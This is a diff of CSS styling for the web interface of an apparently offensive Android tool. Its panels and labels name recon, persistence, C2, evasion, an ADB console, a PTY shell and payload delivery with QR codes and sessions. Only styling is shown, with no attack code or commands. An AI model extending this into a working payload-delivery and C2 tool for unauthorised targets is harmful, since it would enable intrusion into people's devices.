+  --border:rgba(255,255,255,0.07);--border2:rgba(255,255,255,0.14);--border3:rgba(255,255,255,0.28);
+  --text:#a8a8a8;--muted:#505050;--white:#e8e8e8;--off:#c8c8c8;--grey:#888888;
+  --grey2:#666666;--grey3:#3a3a3a;--silver:#b0b0b0;
   --green:#4caf50;--red:#e53935;--blue:#3d8bcd;--green-dim:rgba(76,175,80,0.15);
   --red-dim:rgba(229,57,53,0.12);--blue-dim:rgba(61,139,205,0.12);
+  --accent:#44ddff;--accent-dim:rgba(68,221,255,0.10);--accent-glow:rgba(68,221,255,0.25);
+  --python:#3572A5;--ruby:#CC342D;--rust:#f74c00;--clang:#5c8ab4;--bash:#89E051;--pwsh:#00BFFF;
   --mono:'JetBrains Mono',monospace;--disp:'Syne',sans-serif;--t:0.14s ease;
+  /* category accent colors */
+  --cat-recon:#64b5f6;--cat-access:#ff7043;--cat-payload:#44ddff;
+  --cat-instr:#ce93d8;--cat-persist:#ffb74d;--cat-c2:#66bb6a;
+  --cat-evasion:#f06292;--cat-auto:#ffa726;
 }
 *{box-sizing:border-box;margin:0;padding:0;}
 html{-webkit-font-smoothing:antialiased;}
-body{background:var(--bg);color:var(--text);font-family:var(--mono);
+body{background:#060606;color:var(--text);font-family:var(--mono);
   height:100vh;display:flex;flex-direction:column;overflow:hidden;font-size:13px;line-height:1.6;}
+
+/* CODE RAIN CANVAS */
+#code-bg{
+  position:fixed;top:0;left:0;width:100%;height:100%;
+  z-index:0;pointer-events:none;opacity:1;
+}
+/* raise non-canvas body children above the canvas without overriding their position */
+#topbar,#sessions-bar,#main,#statusbar,#toast-container{position:relative;z-index:1;}
+/* fixed overlays keep their own position:fixed — don't touch sess-drawer */
+
+/* GLOBAL GLOW ANIMATIONS */
+@keyframes accentGlow{
+  0%,100%{box-shadow:0 0 6px var(--accent-glow),0 0 14px var(--accent-dim);}
+  50%{box-shadow:0 0 12px var(--accent-glow),0 0 28px var(--accent-dim),0 0 40px rgba(68,221,255,0.08);}
+}
+@keyframes borderSlide{
+  0%{background-position:0% 50%;}
+  50%{background-position:100% 50%;}
+  100%{background-position:0% 50%;}
+}
+@keyframes logoShimmer{
+  0%,100%{text-shadow:0 0 8px rgba(255,255,255,0.15);}
+  50%{text-shadow:0 0 18px rgba(68,221,255,0.4),0 0 32px rgba(68,221,255,0.15);}
+}
+@keyframes runGlow{
+  0%,100%{box-shadow:0 0 0px transparent;}
+  50%{box-shadow:0 0 16px rgba(76,175,80,0.6),0 0 32px rgba(76,175,80,0.25);}
+}
+@keyframes pillFloat{
+  0%,100%{transform:translateY(0);}
+  50%{transform:translateY(-1px);}
+}
+@keyframes dotBlink{
+  0%,100%{opacity:1;} 50%{opacity:0.3;}
+}
 a{color:var(--blue);text-decoration:none;}
 ::-webkit-scrollbar{width:3px;height:3px;}
 ::-webkit-scrollbar-track{background:var(--bg);}
@@ -1018,38 +1573,52 @@ a{color:var(--blue);text-decoration:none;}
 
 /* SESSIONS BAR */
 #sessions-bar{
-  display:none;align-items:center;gap:6px;padding:4px 16px;
-  background:var(--bg1);border-bottom:1px solid var(--border);
-  flex-shrink:0;overflow-x:auto;
+  display:none;align-items:center;gap:8px;padding:7px 18px;
+  background:var(--bg1);border-bottom:2px solid var(--border2);
+  flex-shrink:0;overflow-x:auto;min-height:38px;
 }
 #sessions-bar.visible{display:flex;}
-#sess-label{font-size:0.55rem;letter-spacing:0.14em;text-transform:uppercase;
-  color:var(--muted);flex-shrink:0;margin-right:4px;}
-.sess-pill{
-  display:flex;align-items:center;gap:5px;
-  border:1px solid var(--border2);padding:2px 8px 2px 6px;
-  font-family:var(--mono);font-size:0.58rem;letter-spacing:0.04em;
-  white-space:nowrap;transition:border-color var(--t);
+#sess-label{
+  font-size:0.62rem;letter-spacing:0.12em;text-transform:uppercase;
+  color:var(--silver);flex-shrink:0;margin-right:6px;font-weight:600;
 }
-.sess-pill:hover{border-color:var(--border3);}
-.sess-pill .sp-dot{width:5px;height:5px;flex-shrink:0;}
+.sess-pill{
+  display:flex;align-items:center;gap:7px;
+  border:1px solid var(--border2);border-radius:3px;
+  padding:4px 11px 4px 8px;
+  font-family:var(--mono);font-size:0.68rem;letter-spacing:0.03em;
+  white-space:nowrap;transition:border-color var(--t),background var(--t);
+  cursor:default;
+}
+.sess-pill:hover{border-color:var(--border3);background:var(--bg2);}
+.sess-pill .sp-dot{width:7px;height:7px;border-radius:50%;flex-shrink:0;}
 .sess-pill .sp-dot.running{animation:pulse .8s infinite;}
-.sess-pill .sp-label{color:var(--white);}
-.sess-pill .sp-dev{color:var(--muted);font-size:0.54rem;margin-left:1px;}
-.sess-pill .sp-time{color:var(--muted);font-size:0.54rem;margin-left:2px;}
+.sess-pill .sp-label{color:var(--white);font-weight:500;font-size:0.68rem;}
+.sess-pill .sp-op{
+  color:var(--accent);font-size:0.64rem;letter-spacing:0.05em;
+  background:rgba(100,220,255,0.08);padding:1px 5px;border-radius:2px;
+}
+.sess-pill .sp-dev{color:var(--muted);font-size:0.62rem;margin-left:2px;}
+.sess-pill .sp-time{
+  color:var(--muted);font-size:0.63rem;margin-left:2px;
+  min-width:28px;text-align:right;
+}
 .sess-pill .sp-kill{
   background:none;border:none;cursor:pointer;
-  color:var(--muted);font-size:0.62rem;padding:0 0 0 4px;
+  color:var(--muted);font-size:0.75rem;padding:0 0 0 5px;
   line-height:1;transition:color var(--t);
 }
 .sess-pill .sp-kill:hover{color:var(--red);}
-.sess-pill.done   .sp-dot{background:var(--muted);}
-.sess-pill.error  .sp-dot{background:var(--red);}
-.sess-pill.done   .sp-label{color:var(--muted);}
-.sess-pill.error  .sp-label{color:var(--red);}
+.sess-pill.running{border-color:rgba(100,220,255,0.3);}
+.sess-pill.done    .sp-dot{background:var(--muted)!important;}
+.sess-pill.error   .sp-dot{background:var(--red)!important;}
+.sess-pill.done    .sp-label{color:var(--muted);}
+.sess-pill.done    .sp-op{color:var(--muted);background:transparent;}
+.sess-pill.error   .sp-label{color:var(--red);}
+.sess-pill.error   .sp-op{color:var(--red);background:rgba(255,80,80,0.08);}
 #sess-count{
-  font-size:0.58rem;color:var(--muted);flex-shrink:0;margin-left:auto;
-  letter-spacing:0.06em;
+  font-size:0.65rem;color:var(--muted);flex-shrink:0;margin-left:auto;
+  letter-spacing:0.06em;padding-left:8px;border-left:1px solid var(--border);
 }
 
 /* PROCESS SNIFFER PANEL */
@@ -1096,16 +1665,18 @@ a{color:var(--blue);text-decoration:none;}
 /* TOP BAR */
 #topbar{
   display:flex;align-items:center;gap:14px;padding:0 18px;height:52px;
-  background:var(--bg);border-bottom:1px solid var(--border2);flex-shrink:0;
+  background:rgba(6,6,6,0.88);border-bottom:1px solid rgba(68,221,255,0.18);
+  flex-shrink:0;backdrop-filter:blur(6px);
 }
 #topbar .logo{
   font-family:var(--disp);font-size:1.05rem;font-weight:800;
   color:var(--white);letter-spacing:-0.02em;white-space:nowrap;
+  animation:logoShimmer 4s ease-in-out infinite;
 }
-#topbar .logo-sep{color:var(--muted);font-weight:400;margin:0 4px;}
+#topbar .logo-sep{color:var(--accent);font-weight:400;margin:0 4px;opacity:0.6;}
 #topbar .logo-sub{
   font-family:var(--mono);font-size:0.6rem;letter-spacing:0.14em;
-  text-transform:uppercase;color:var(--muted);
+  text-transform:uppercase;color:var(--accent);opacity:0.55;
 }
 #topbar .devbadge{
   display:flex;align-items:center;gap:8px;
@@ -1138,9 +1709,40 @@ a{color:var(--blue);text-decoration:none;}
 
 /* SIDEBAR */
 #sidebar{
-  width:220px;flex-shrink:0;background:var(--bg1);border-right:1px solid var(--border2);
+  width:210px;flex-shrink:0;background:rgba(12,12,12,0.95);
+  border-right:1px solid rgba(255,255,255,0.08);
   display:flex;flex-direction:column;overflow-y:auto;
+  transition:width 0.2s ease,opacity 0.2s ease;
 }
+#sidebar.hidden{width:0;overflow:hidden;border-right:none;opacity:0;pointer-events:none;}
+#topbar #sidebar-toggle-btn.active{color:var(--accent);border-color:var(--accent);}
+
+/* APK FILE BROWSER MODAL */
+#apk-browser-overlay{position:fixed;inset:0;background:rgba(0,0,0,0.65);z-index:9000;display:none;align-items:center;justify-content:center;}
+#apk-browser-overlay.show{display:flex;}
+#apk-browser-modal{background:var(--bg1);border:1px solid var(--border2);width:520px;max-width:95vw;max-height:70vh;display:flex;flex-direction:column;box-shadow:0 8px 48px rgba(0,0,0,0.7);}
+#apk-browser-header{display:flex;align-items:center;gap:8px;padding:10px 14px;border-bottom:1px solid var(--border2);flex-shrink:0;}
+#apk-browser-title{font-size:0.58rem;letter-spacing:0.18em;text-transform:uppercase;color:var(--muted);font-weight:700;}
+#apk-browser-path{flex:1;font-family:var(--mono);font-size:0.62rem;color:var(--silver);overflow:hidden;text-overflow:ellipsis;white-space:nowrap;}
+#apk-browser-close{background:none;border:none;color:var(--muted);font-size:1rem;cursor:pointer;padding:0 4px;line-height:1;}
+#apk-browser-close:hover{color:var(--white);}
+#apk-browser-toolbar{display:flex;align-items:center;gap:6px;padding:6px 14px;border-bottom:1px solid var(--border2);flex-shrink:0;}
+#apk-browser-up{background:none;border:1px solid var(--border2);color:var(--muted);font-family:var(--mono);font-size:0.6rem;padding:3px 10px;cursor:pointer;transition:color var(--t),border-color var(--t);}
+#apk-browser-up:hover{color:var(--white);border-color:var(--border3);}
+#apk-browser-filter{flex:1;background:var(--bg2);border:1px solid var(--border2);color:var(--white);font-family:var(--mono);font-size:0.65rem;padding:4px 8px;outline:none;}
+#apk-browser-filter::placeholder{color:var(--muted);}
+#apk-browser-list{flex:1;overflow-y:auto;padding:4px 0;}
+.apk-entry{display:flex;align-items:center;gap:10px;padding:6px 14px;cursor:pointer;font-family:var(--mono);font-size:0.68rem;border-bottom:1px solid rgba(68,221,255,0.04);transition:background var(--t);}
+.apk-entry:hover{background:rgba(255,255,255,0.04);}
+.apk-entry.is-dir{color:var(--silver);}
+.apk-entry.is-apk{color:var(--accent);}
+.apk-entry.is-apk:hover{background:rgba(68,221,255,0.07);}
+.apk-entry.is-other{color:var(--muted);cursor:default;}
+.apk-entry .ae-icon{font-size:0.7rem;flex-shrink:0;width:14px;text-align:center;}
+.apk-entry .ae-name{flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;}
+.apk-entry .ae-size{font-size:0.58rem;color:var(--muted);flex-shrink:0;}
+#apk-browser-empty{padding:24px 14px;text-align:center;color:var(--muted);font-size:0.65rem;display:none;}
+#apk-browser-loading{padding:20px 14px;text-align:center;color:var(--muted);font-size:0.65rem;letter-spacing:0.1em;}
 #dev-selector{padding:10px 12px;border-bottom:1px solid var(--border2);}
 #dev-selector select{
   width:100%;background:var(--bg2);border:1px solid var(--border2);color:var(--white);
@@ -1150,38 +1752,66 @@ a{color:var(--blue);text-decoration:none;}
   width:100%;margin-top:6px;background:none;border:1px solid var(--border2);
   color:var(--muted);padding:5px;font-family:var(--mono);font-size:0.62rem;
   letter-spacing:0.08em;text-transform:uppercase;cursor:pointer;
-  transition:color var(--t),border-color var(--t);
+  transition:color var(--t),border-color var(--t),box-shadow var(--t);
 }
-#dev-selector button:hover{color:var(--white);border-color:var(--border3);}
-.op-group{border-bottom:1px solid var(--border);}
+#dev-selector button:hover{color:var(--accent);border-color:var(--accent);box-shadow:0 0 8px var(--accent-dim);}
+.op-group{border-bottom:1px solid rgba(255,255,255,0.06);}
 .op-group-title{
-  padding:8px 12px;color:var(--muted);font-size:0.58rem;text-transform:uppercase;
-  letter-spacing:0.18em;cursor:pointer;user-select:none;display:flex;
+  padding:8px 10px 8px 12px;color:var(--grey2);font-size:0.56rem;text-transform:uppercase;
+  letter-spacing:0.16em;cursor:pointer;user-select:none;display:flex;
   justify-content:space-between;align-items:center;
-  transition:color var(--t);
+  border-left:3px solid transparent;
+  transition:color var(--t),border-color var(--t),background var(--t);
 }
-.op-group-title:hover{color:var(--grey);}
-.op-group-title .arrow{transition:.2s;font-size:0.5rem;}
+.op-group-title:hover{color:var(--silver);background:rgba(255,255,255,0.025);}
+.op-group-title .arrow{transition:.2s;font-size:0.48rem;color:var(--grey3);}
 .op-group.collapsed .arrow{transform:rotate(-90deg);}
 .op-group.collapsed .op-list{display:none;}
 .op-item{
-  padding:8px 14px;cursor:pointer;color:var(--grey);font-size:0.72rem;
-  border-left:2px solid transparent;transition:color var(--t),background var(--t);
+  padding:7px 14px 7px 15px;cursor:pointer;color:var(--grey2);font-size:0.7rem;
+  border-left:2px solid transparent;transition:color var(--t),background var(--t),border-color var(--t);
 }
-.op-item:hover{color:var(--white);background:var(--bg2);}
-.op-item.active{color:var(--white);border-left-color:var(--white);background:var(--bg2);}
+.op-item:hover{color:var(--silver);background:rgba(255,255,255,0.03);border-left-color:var(--grey3);}
+.op-item.active{color:var(--white);font-weight:500;}
+/* category accent on group title border and active item */
+.op-group[data-cat="recon"]   .op-group-title{border-left-color:var(--cat-recon);}
+.op-group[data-cat="access"]  .op-group-title{border-left-color:var(--cat-access);}
+.op-group[data-cat="payload"] .op-group-title{border-left-color:var(--cat-payload);}
+.op-group[data-cat="instr"]   .op-group-title{border-left-color:var(--cat-instr);}
+.op-group[data-cat="persist"] .op-group-title{border-left-color:var(--cat-persist);}
+.op-group[data-cat="c2"]      .op-group-title{border-left-color:var(--cat-c2);}
+.op-group[data-cat="evasion"] .op-group-title{border-left-color:var(--cat-evasion);}
+.op-group[data-cat="auto"]    .op-group-title{border-left-color:var(--cat-auto);}
+.op-group[data-cat="recon"]   .op-group-title{color:var(--cat-recon);opacity:0.75;}
+.op-group[data-cat="access"]  .op-group-title{color:var(--cat-access);opacity:0.75;}
+.op-group[data-cat="payload"] .op-group-title{color:var(--cat-payload);opacity:0.75;}
+.op-group[data-cat="instr"]   .op-group-title{color:var(--cat-instr);opacity:0.75;}
+.op-group[data-cat="persist"] .op-group-title{color:var(--cat-persist);opacity:0.75;}
+.op-group[data-cat="c2"]      .op-group-title{color:var(--cat-c2);opacity:0.75;}
+.op-group[data-cat="evasion"] .op-group-title{color:var(--cat-evasion);opacity:0.75;}
+.op-group[data-cat="auto"]    .op-group-title{color:var(--cat-auto);opacity:0.75;}
+.op-group[data-cat="recon"]   .op-item.active{color:var(--cat-recon);border-left-color:var(--cat-recon);background:rgba(100,181,246,0.06);}
+.op-group[data-cat="access"]  .op-item.active{color:var(--cat-access);border-left-color:var(--cat-access);background:rgba(255,112,67,0.06);}
+.op-group[data-cat="payload"] .op-item.active{color:var(--cat-payload);border-left-color:var(--cat-payload);background:rgba(68,221,255,0.06);}
+.op-group[data-cat="instr"]   .op-item.active{color:var(--cat-instr);border-left-color:var(--cat-instr);background:rgba(206,147,216,0.06);}
+.op-group[data-cat="persist"] .op-item.active{color:var(--cat-persist);border-left-color:var(--cat-persist);background:rgba(255,183,77,0.06);}
+.op-group[data-cat="c2"]      .op-item.active{color:var(--cat-c2);border-left-color:var(--cat-c2);background:rgba(102,187,106,0.06);}
+.op-group[data-cat="evasion"] .op-item.active{color:var(--cat-evasion);border-left-color:var(--cat-evasion);background:rgba(240,98,146,0.06);}
+.op-group[data-cat="auto"]    .op-item.active{color:var(--cat-auto);border-left-color:var(--cat-auto);background:rgba(255,167,38,0.06);}
 
 /* RIGHT */
 #right{display:flex;flex-direction:column;flex:1;overflow:hidden;}
 
 /* PARAMS PANEL */
 #params-panel{
-  background:var(--bg1);border-bottom:1px solid var(--border2);
+  background:rgba(12,12,12,0.9);border-bottom:1px solid rgba(68,221,255,0.1);
   padding:14px 18px;flex-shrink:0;overflow-y:auto;max-height:240px;
+  backdrop-filter:blur(4px);
 }
 #params-panel .op-title{
   font-family:var(--disp);font-size:1rem;font-weight:700;letter-spacing:-0.02em;
   color:var(--white);margin-bottom:4px;
+  text-shadow:0 0 20px rgba(68,221,255,0.2);
 }
 #params-panel .op-desc{color:var(--muted);font-size:0.68rem;margin-bottom:12px;line-height:1.7;}
 #params-form{display:flex;flex-wrap:wrap;gap:10px;align-items:flex-end;}
@@ -1190,35 +1820,60 @@ a{color:var(--blue);text-decoration:none;}
   color:var(--muted);font-size:0.58rem;text-transform:uppercase;letter-spacing:0.12em;
 }
 .field input,.field select{
-  background:var(--bg2);border:1px solid var(--border2);color:var(--white);
+  background:rgba(22,22,22,0.95);border:1px solid var(--border2);color:var(--white);
   padding:6px 8px;font-family:var(--mono);font-size:0.75rem;width:100%;
-  transition:border-color var(--t);
+  transition:border-color var(--t),box-shadow var(--t);
 }
-.field input:focus,.field select:focus{outline:none;border-color:var(--border3);}
+.field input:focus,.field select:focus{
+  outline:none;border-color:var(--accent);
+  box-shadow:0 0 0 1px var(--accent-dim),0 0 8px var(--accent-dim);
+}
 #run-btn{
-  background:var(--white);color:var(--bg);border:none;padding:7px 20px;
-  font-family:var(--disp);font-size:0.78rem;font-weight:700;letter-spacing:0.04em;
+  background:var(--white);color:#060606;border:none;padding:7px 22px;
+  font-family:var(--disp);font-size:0.78rem;font-weight:700;letter-spacing:0.06em;
   cursor:pointer;height:32px;margin-top:auto;text-transform:uppercase;
-  transition:background var(--t);
+  transition:background var(--t),box-shadow var(--t),transform var(--t);
+  position:relative;overflow:hidden;
 }
-#run-btn:hover{background:var(--off);}
-#run-btn:disabled{background:var(--bg4);cursor:not-allowed;color:var(--muted);}
+#run-btn::after{
+  content:'';position:absolute;inset:0;
+  background:linear-gradient(90deg,transparent 0%,rgba(255,255,255,0.18) 50%,transparent 100%);
+  transform:translateX(-100%);transition:transform 0.4s ease;
+}
+#run-btn:hover{background:var(--off);box-shadow:0 0 14px rgba(76,175,80,0.4);transform:translateY(-1px);}
+#run-btn:hover::after{transform:translateX(100%);}
+#run-btn:active{transform:translateY(0);}
+#run-btn.running-glow{animation:runGlow 1.2s ease-in-out infinite;}
+#run-btn:disabled{background:var(--bg4);cursor:not-allowed;color:var(--muted);box-shadow:none;transform:none;}
+.op-cli-hint{display:flex;align-items:center;gap:8px;margin-top:6px;padding:5px 10px;background:rgba(255,255,255,0.03);border:1px solid rgba(255,255,255,0.07);width:100%;}
+.op-cli-label{font-size:0.5rem;letter-spacing:0.18em;text-transform:uppercase;color:var(--muted);flex-shrink:0;font-weight:700;padding:1px 5px;border:1px solid var(--border2);}
+.op-cli-hint code{font-family:var(--mono);font-size:0.62rem;color:var(--grey);white-space:nowrap;overflow:hidden;text-overflow:ellipsis;}
+.params-placeholder{display:flex;flex-direction:column;gap:6px;padding:4px 0;}
+.params-placeholder .pp-title{font-family:var(--disp);font-size:0.9rem;font-weight:700;color:var(--white);letter-spacing:-0.02em;}
+.params-placeholder .pp-hint{font-size:0.65rem;color:var(--muted);line-height:1.6;}
+.params-placeholder .pp-cats{display:flex;flex-wrap:wrap;gap:5px;margin-top:4px;}
+.pp-cat{font-size:0.55rem;letter-spacing:0.1em;padding:2px 8px;border:1px solid;font-family:var(--mono);}
 
 /* TABS */
 #tabs{
-  display:flex;background:var(--bg1);border-bottom:1px solid var(--border2);
-  flex-shrink:0;overflow-x:auto;
+  display:flex;background:rgba(10,10,10,0.9);border-bottom:1px solid rgba(68,221,255,0.1);
+  flex-shrink:0;overflow-x:auto;backdrop-filter:blur(4px);
 }
 .tab{
   padding:10px 16px;cursor:pointer;color:var(--muted);
   font-size:0.65rem;letter-spacing:0.1em;text-transform:uppercase;
-  border-bottom:2px solid transparent;transition:color var(--t),border-color var(--t);white-space:nowrap;
+  border-bottom:2px solid transparent;transition:color var(--t),border-color var(--t),text-shadow var(--t);
+  white-space:nowrap;
 }
 .tab:hover{color:var(--grey);}
-.tab.active{color:var(--white);border-bottom-color:var(--white);}
+.tab.active{
+  color:var(--accent);border-bottom-color:var(--accent);
+  text-shadow:0 0 12px var(--accent-glow);
+}
 .tab .badge{
   display:inline-block;background:var(--red);color:var(--white);
   font-size:0.5rem;padding:1px 5px;margin-left:5px;letter-spacing:0;
+  animation:dotBlink 1.5s ease-in-out infinite;
 }
 
 /* TERMINAL */
@@ -1245,7 +1900,7 @@ a{color:var(--blue);text-decoration:none;}
 .tt-sep{width:1px;height:14px;background:var(--border2);flex-shrink:0;}
 #term-line-ct{font-size:0.58rem;color:var(--muted);margin-left:auto;white-space:nowrap;}
 #terminal{
-  flex:1;overflow-y:auto;padding:14px 18px;background:var(--bg);
+  flex:1;overflow-y:auto;padding:14px 18px;background:rgba(6,6,6,0.72);
   font-family:var(--mono);font-size:0.78rem;line-height:1.75;white-space:pre-wrap;word-break:break-all;
 }
 #terminal.nowrap{white-space:nowrap;word-break:normal;overflow-x:auto;}
@@ -1258,7 +1913,7 @@ a{color:var(--blue);text-decoration:none;}
 /* ADB CONSOLE */
 #adb-console{display:none;flex-direction:column;flex:1;overflow:hidden;}
 #adb-output{
-  flex:1;overflow-y:auto;padding:14px 18px;background:var(--bg);
+  flex:1;overflow-y:auto;padding:14px 18px;background:rgba(6,6,6,0.72);
   font-family:var(--mono);font-size:0.78rem;line-height:1.75;white-space:pre-wrap;
 }
 #adb-input-row{
@@ -1270,6 +1925,49 @@ a{color:var(--blue);text-decoration:none;}
   flex:1;background:transparent;border:none;color:var(--white);
   font-family:var(--mono);font-size:0.78rem;outline:none;
 }
+
+/* SHELL (PTY) */
+#shell-panel{display:none;flex-direction:column;flex:1;overflow:hidden;}
+#shell-toolbar{
+  display:flex;align-items:center;gap:5px;padding:4px 10px;
+  background:var(--bg1);border-bottom:1px solid var(--border2);flex-shrink:0;flex-wrap:wrap;
+}
+#shell-toolbar .tt-btn{
+  background:none;border:1px solid var(--border2);color:var(--muted);
+  font-family:var(--mono);font-size:0.6rem;letter-spacing:0.06em;padding:2px 9px;cursor:pointer;
+  transition:color var(--t),border-color var(--t);white-space:nowrap;
+}
+#shell-toolbar .tt-btn:hover{color:var(--white);border-color:var(--border3);}
+#shell-toolbar .tt-btn.active{color:var(--green);border-color:var(--green);}
+#pty-dot{width:7px;height:7px;border-radius:50%;background:var(--muted);flex-shrink:0;transition:background var(--t);}
+#pty-dot.on{background:var(--green);box-shadow:0 0 5px var(--green);}
+#pty-status{font-size:0.6rem;color:var(--muted);letter-spacing:0.08em;transition:color var(--t);}
+#pty-status.on{color:var(--green);}
+#pty-info{margin-left:auto;font-size:0.57rem;color:var(--muted);}
+#pty-output{
+  flex:1;overflow-y:auto;padding:12px 16px;
+  background:rgba(6,6,6,0.82);
+  font-family:var(--mono);font-size:0.78rem;line-height:1.75;
+  white-space:pre-wrap;word-break:break-all;
+}
+#pty-input-row{
+  display:flex;align-items:center;gap:0;padding:0;
+  background:rgba(8,8,8,0.96);border-bottom:1px solid rgba(255,255,255,0.07);flex-shrink:0;
+}
+#pty-prompt-label{
+  display:flex;align-items:center;gap:5px;
+  font-family:var(--mono);font-size:0.7rem;font-weight:600;
+  white-space:nowrap;padding:8px 0 8px 14px;flex-shrink:0;user-select:none;
+}
+#pty-prompt-label .ppl-brand{color:var(--accent);letter-spacing:0.04em;}
+#pty-prompt-label .ppl-sep{color:var(--grey3);}
+#pty-prompt-label .ppl-caret{color:var(--green);}
+#pty-input{
+  flex:1;background:transparent;border:none;color:var(--white);
+  font-family:var(--mono);font-size:0.75rem;outline:none;caret-color:var(--green);
+  padding:8px 14px 8px 5px;
+}
+#pty-input::placeholder{color:var(--grey3);font-size:0.63rem;}
 
 /* FINDINGS */
 #findings-panel{display:none;flex-direction:column;flex:1;overflow:hidden;}
@@ -1376,14 +2074,201 @@ a{color:var(--blue);text-decoration:none;}
   overflow-x:auto;white-space:pre;line-height:1.6;
 }
 
-/* DELIVERY TAB */
-#qr-panel{display:none;flex-direction:column;flex:1;overflow-y:auto;padding:16px;}
-.qr-card{
-  background:var(--bg1);border:1px solid var(--border2);
-  margin-bottom:12px;padding:14px 16px;
-}
+/* DELIVERY TAB (legacy compat) */
+#qr-panel{display:none;}
+.qr-card{background:var(--bg1);border:1px solid var(--border2);margin-bottom:12px;padding:14px 16px;}
 .qr-card pre{color:var(--green);font-size:0.68rem;line-height:1.1;overflow-x:auto;}
 .qr-url{color:var(--blue);font-size:0.8rem;word-break:break-all;}
+
+/* ══ UNIFIED PAYLOAD & DELIVERY PANEL ══════════════════════════════════════ */
+#pd-panel{display:none;flex-direction:column;flex:1;overflow:hidden;min-height:0;}
+.pd-toolbar{
+  display:flex;align-items:center;gap:8px;padding:7px 14px;
+  background:var(--bg1);border-bottom:1px solid var(--border2);
+  flex-shrink:0;flex-wrap:wrap;
+}
+.pd-toolbar-title{
+  font-size:0.6rem;letter-spacing:0.16em;text-transform:uppercase;
+  color:var(--silver);font-weight:600;margin-right:6px;
+}
+.pd-body{flex:1;overflow-y:auto;padding:12px 16px;display:flex;flex-direction:column;gap:0;min-height:0;}
+/* ── mod-menu rows ── */
+.pm-row{padding:10px 0;border-bottom:1px solid var(--border2);}
+.pm-row:last-child{border-bottom:none;padding-bottom:4px;}
+.pm-lbl{
+  font-size:0.5rem;letter-spacing:0.2em;text-transform:uppercase;
+  color:var(--muted);font-weight:700;margin-bottom:8px;
+}
+/* chip radios / delivery selectors */
+.pm-chips{display:flex;flex-wrap:wrap;gap:4px;}
+.pm-chip{
+  font-family:var(--mono);font-size:0.62rem;letter-spacing:0.04em;
+  padding:4px 12px;border:1px solid var(--border2);color:var(--muted);
+  cursor:pointer;transition:all var(--t);user-select:none;
+}
+.pm-chip:hover{color:var(--white);border-color:var(--border3);}
+.pm-chip.sel{color:var(--accent);border-color:var(--accent);background:rgba(68,221,255,0.07);}
+.pm-chip input[type=radio]{display:none;}
+/* inline sub-fields (conditional) */
+.pm-sub{display:none;margin-top:9px;}
+.pm-sub.show{display:flex;flex-direction:column;gap:7px;}
+.pm-inrow{display:flex;gap:8px;flex-wrap:wrap;align-items:flex-end;}
+.pm-col{flex:1;min-width:110px;}
+/* checkboxes row */
+.pm-chk-row{display:flex;gap:14px;flex-wrap:wrap;}
+.pm-chk{display:flex;align-items:center;gap:6px;cursor:pointer;font-size:0.68rem;color:var(--text);}
+.pm-chk input[type=checkbox]{accent-color:var(--accent);width:13px;height:13px;cursor:pointer;}
+.pm-chk:hover{color:var(--white);}
+/* big go button */
+.pm-action{display:flex;gap:8px;align-items:stretch;padding:12px 0 4px;}
+.pm-go{
+  flex:1;font-family:var(--mono);font-size:0.7rem;letter-spacing:0.1em;text-transform:uppercase;
+  padding:12px 20px;border:1px solid var(--white);background:var(--white);color:var(--bg);
+  cursor:pointer;font-weight:700;transition:background var(--t);
+}
+.pm-go:hover{background:var(--off);}
+.pm-go:disabled{opacity:0.35;cursor:not-allowed;}
+/* compat aliases used by existing JS */
+.pd-fcard{background:var(--bg1);border:1px solid var(--border2);padding:12px 14px;}
+.pd-fhdr{
+  font-size:0.52rem;letter-spacing:0.18em;text-transform:uppercase;color:var(--muted);
+  margin-bottom:8px;display:flex;align-items:center;gap:8px;font-weight:700;
+}
+.pd-fhdr::after{content:'';flex:1;height:1px;background:var(--border2);}
+/* shared utilities */
+.pd-sess-grid{display:grid;grid-template-columns:1fr 1fr;gap:12px;}
+@media(max-width:700px){.pd-sess-grid{grid-template-columns:1fr;}}
+.pd-act-row{display:flex;gap:8px;align-items:center;flex-wrap:wrap;margin-top:8px;}
+.pd-btn{
+  font-family:var(--mono);font-size:0.62rem;letter-spacing:0.06em;text-transform:uppercase;
+  padding:6px 14px;border:1px solid var(--border2);background:none;color:var(--text);cursor:pointer;
+  transition:all var(--t);white-space:nowrap;
+}
+.pd-btn:hover{color:var(--white);border-color:var(--border3);}
+.pd-btn.primary{background:var(--white);color:var(--bg);border-color:var(--white);font-weight:700;}
+.pd-btn.primary:hover{background:var(--off);}
+.pd-btn.accent{border-color:var(--accent);color:var(--accent);}
+.pd-btn.accent:hover{background:var(--accent-dim);}
+.pd-btn.go{background:var(--green);color:#000;border-color:var(--green);font-weight:600;}
+.pd-btn.go:hover{background:#45a049;}
+.pd-btn.danger{border-color:var(--red);color:var(--red);}
+.pd-btn.danger:hover{background:var(--red-dim);}
+.pd-btn:disabled{opacity:0.35;cursor:not-allowed;}
+.pd-log{
+  background:rgba(6,6,6,0.9);border:1px solid var(--border2);
+  font-family:var(--mono);font-size:0.65rem;line-height:1.7;padding:9px 13px;
+  min-height:54px;max-height:160px;overflow-y:auto;white-space:pre-wrap;word-break:break-all;
+  margin-top:8px;
+}
+.pd-url-box{
+  font-family:var(--mono);font-size:0.7rem;color:var(--accent);word-break:break-all;
+  background:var(--bg2);border:1px solid var(--border2);padding:6px 10px;margin:4px 0;
+}
+.pd-info{
+  font-size:0.64rem;color:var(--muted);padding:6px 10px;
+  background:var(--bg2);border-left:2px solid var(--border2);line-height:1.6;
+}
+.pd-qr-area{display:flex;gap:10px;flex-wrap:wrap;}
+.pd-qr-card{background:var(--bg1);border:1px solid var(--border2);padding:11px 13px;flex:1;min-width:200px;}
+.pd-qr-pre{color:var(--green);font-size:0.58rem;line-height:1.0;overflow-x:auto;}
+.pd-sess-list{display:flex;flex-direction:column;gap:4px;}
+.pd-sess-row{
+  display:flex;align-items:center;gap:9px;background:var(--bg2);
+  border:1px solid var(--border2);padding:7px 11px;transition:border-color var(--t);
+}
+.pd-sess-row:hover{border-color:var(--border3);}
+.pd-sess-row.active-sess{border-color:var(--accent);}
+.pd-sess-dot{width:7px;height:7px;border-radius:50%;flex-shrink:0;}
+.pd-sess-dot.running{animation:pulse .8s infinite;}
+.pd-sess-info{flex:1;display:flex;flex-direction:column;gap:2px;overflow:hidden;}
+.pd-sess-id{font-size:0.7rem;color:var(--white);font-weight:600;}
+.pd-sess-meta{font-size:0.58rem;color:var(--muted);overflow:hidden;text-overflow:ellipsis;white-space:nowrap;}
+.pd-sess-acts{display:flex;gap:4px;flex-shrink:0;}
